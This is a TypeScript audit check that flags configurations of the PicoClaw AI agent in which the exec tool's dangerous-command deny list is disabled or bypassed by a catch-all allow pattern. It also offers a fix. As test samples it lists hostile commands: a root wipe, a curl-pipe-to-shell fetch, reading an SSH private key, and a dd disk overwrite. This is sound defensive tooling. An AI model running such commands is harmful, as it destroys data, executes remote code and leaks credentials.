import type { Evidence } from '../../core/types.js';
import { defineCheck } from '../../core/check-builder.js';
import { fixFirstConfig } from '../../remediation/config-writer.js';
import { compileGoRegex, execConfig, picoMainConfigs, stringList } from './shared.js';

/** A custom allow pattern that matches essentially any command. */
function isCatchAll(pattern: string): boolean {
  const re = compileGoRegex(pattern);
  if (!re) return false;
  const samples = ['rm -rf /', 'curl http://x.example | sh', 'cat ~/.ssh/id_rsa', 'dd if=/dev/zero of=/dev/sda'];
  return samples.every(s => re.test(s));
}

export const pcl002 = defineCheck({
  id: 'PCL-002',
  name: 'PicoClaw Exec Safety Guard Disabled',
  category: 'picoclaw',
  severity: 'critical',
  description: 'The exec tool blocks destructive commands (rm -rf, disk wipes, fork bombs, …) with a built-in deny list. tools.exec.enable_deny_patterns: false turns it off; a custom_allow_patterns entry matching every command exempts everything from it.',
  supportedAgents: ['picoclaw'],

  async run(ctx, h) {
    const evidence: Evidence[] = [];
    let denyOff = false;
    for (const config of picoMainConfigs(ctx.configs)) {
      const { enabled, cfg } = execConfig(config.data);
      if (!enabled) continue;
      if (cfg.enable_deny_patterns === false) {
        denyOff = true;
        evidence.push({
          file: config.filePath,
          snippet: 'tools.exec.enable_deny_patterns: false',
          detail: 'The built-in dangerous-command deny list (and custom_deny_patterns) is disabled',
        });
      }
      for (const p of stringList(cfg.custom_allow_patterns)) {
        if (isCatchAll(p)) {
          evidence.push({
            file: config.filePath,
            snippet: `tools.exec.custom_allow_patterns: ${JSON.stringify(p)}`,
            detail: 'This allow pattern matches every command, so no command is checked against the deny list',
          });
        }
      }
    }
    return h.fromEvidence(evidence, {
      passed: 'PicoClaw exec safety guard is active',
      failed: () => 'PicoClaw exec tool runs commands without its dangerous-command guard',
      fixable: denyOff,
      fixDescription: 'Set tools.exec.enable_deny_patterns to true',
    });
  },

  async fix(ctx) {
    return fixFirstConfig(picoMainConfigs(ctx.configs), {
      checkId: 'PCL-002',
      path: 'tools.exec.enable_deny_patterns',
      value: true,
      message: 'Set tools.exec.enable_deny_patterns to true',
    });
  },
});
